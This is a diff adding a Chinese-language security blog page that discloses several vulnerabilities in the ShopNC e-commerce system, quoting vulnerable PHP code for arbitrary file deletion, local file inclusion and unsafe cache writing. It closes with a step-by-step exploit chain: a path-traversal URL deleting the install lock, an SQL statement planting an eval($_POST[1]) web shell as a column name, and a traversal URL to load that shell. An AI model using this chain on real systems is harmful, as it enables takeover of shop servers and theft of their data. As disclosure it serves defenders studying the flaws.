@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>电子商务系统ShopNC多个漏洞(可暴力 getshell)</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>电子商务系统ShopNC多个漏洞(可暴力 getshell)</h2>
+	<p class="meta">2014-03-11</p>
+
+	<div class="post">
+	        <p></p>
+<h3><span style="color: rgb(38, 38, 38);"><strong>前言</strong></span></h3>
+<p><span style="color: rgb(38, 38, 38);"><strong>ShopNC是一款S是网城创想公司旗下服务于企业客户的电子商务系统，基于PHP5技术采用MVC 模式开发，本文介绍了shopnc多个漏洞结合,可getshell有点暴力-_-</strong></span></p>
+<p style="text-align: center;"><img data-original="/imgs/210ffdf3f7dc1b7ae0d2657da84b1e2a.jpg!small" src="/imgs/210ffdf3f7dc1b7ae0d2657da84b1e2a.jpg!small" title="shopnc.jpg"></p>
+<noscript><img src="/imgs/210ffdf3f7dc1b7ae0d2657da84b1e2a.jpg!small" title="shopnc.jpg"></noscript>
+<h3><span style="color: rgb(38, 38, 38);"><strong>任意文件删除</strong></span></h3>
+<p>文件 control\store.php 1438 行 (还有几个同样的地方,新版已修复)</p>
+<pre class="prettyprint lang-php">........
+$model_upload = Model('upload');
+        $file_info = $model_upload-&gt;getOneUpload(intval($_GET['file_id']));
+        if(!$file_info){
+            @unlink(ATTACH_SLIDE.DS.$_GET['img_src']);
+        }else{
+ 
+........</pre>
+<h3><span style="color: rgb(38, 38, 38);"><strong>本地文件包含</strong></span></h3>
+<p>文件 /framework/core/base.php 71行</p>
+<pre class="prettyprint lang-php">$act_file = realpath( BasePath.DS."control".DS.$_GET['act'].".php" );
+    }
+    if ( is_file( $act_file ) )
+    {
+        require( $act_file );
+        $class_name = $_GET['act']."Control";
+        if ( class_exists( $class_name ) )</pre>
+<h3><span style="color: rgb(38, 38, 38);"><strong>后台更新缓存写shell</strong></span></h3>
+<p>文件 model/adv_model.php 416 行</p>
+<pre class="prettyprint lang-php">/**
+     * 更新一条广告缓存
+     *
+     * @param unknown_type $adv
+     * @return unknown
+     */
+    public function makeAdvCache($adv){
+        $lang   = Language::getLangContent();
+        $tmp .= "&lt;?php \r\n";
+        $tmp .= "defined('InShopNC') or exit('Access Invalid!'); \r\n";
+        if (is_numeric($adv) &amp;&amp; $adv &gt; 0){
+ 
+            $condition['adv_id'] = $adv;
+            $adv_info = $this-&gt;getList($condition);
+            $adv = $adv_info['0'];
+        }
+    ..................................
+                       $content = addslashes($v);
+            $content = str_replace('$','\$',$content);
+            //防止有$符号被解析成变量
+            $tmp .= '$'.$k." = \"".$content."\"; \r\n";
+        }
+        //缓存文件存放位置及文件名
+        $cache_file = BasePath.'/cache/adv/adv_'.$adv['adv_id'].'.cache.php';
+        file_put_contents($cache_file,$tmp);</pre>
+<p>继续跟进getList函数 </p>
+<pre class="prettyprint lang-php">public function getList($condition=array(), $page='', $limit='', $orderby=''){
+    $param  = array();
+    $param['table'] = 'adv';
+    $param['field'] = $condition['field']?$condition['field']:'*';
+    $param['where'] = $this-&gt;getCondition($condition);
+    if($orderby == ''){
+        $param['order'] = 'slide_sort, adv_id desc';
+    }else{
+        $param['order'] = $orderby;
+    }
+    $param['limit'] = $limit;
+    return Db::select($param,$page);
+}</pre>
+<p>写文件时,从数据库中遍历key,跟value 未过滤key,key 可以从数据库读取,当有数据库可控时,即可写入任意文件.</p>
+<h3><span style="color: rgb(38, 38, 38);"><strong>ShopNc GetShell</strong></span></h3>
+<p>结合以上三个漏洞,即可优雅的 getshell<br>
+流程</p>
+<pre class="prettyprint lang-html">任意文件删除 =&gt; 重装 =&gt; 更改数据库 shopnc_adv 键值 =&gt;更新广告缓存 =&gt;getshell</pre>
+<p><span style="color: rgb(38, 38, 38);"><strong>具体步骤</strong></span><br></p>
+<p>1:http://www.xxx.com/index.php?act=store&amp;op=dorp_img&amp;file_id=16&amp;img_src=/../../../install/lock<br></p>
+<p>2:重装系统<br>
+3:进入MySQL  执行sql  ALTER TABLE `shopnc_adv` ADD `{eval($_POST[1])}` VARCHAR( 100 ) NOT NULL <br></p>
+<p>4:进入后台 更新广告缓存  http://www.xxx.com/admin/index.php?act=adv&amp;op=adv_edit&amp;adv_id=14<br></p>
+<p>5:连接shell   http://www.xxx.com/index.php?act=../cache/adv/adv_14.cache</p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
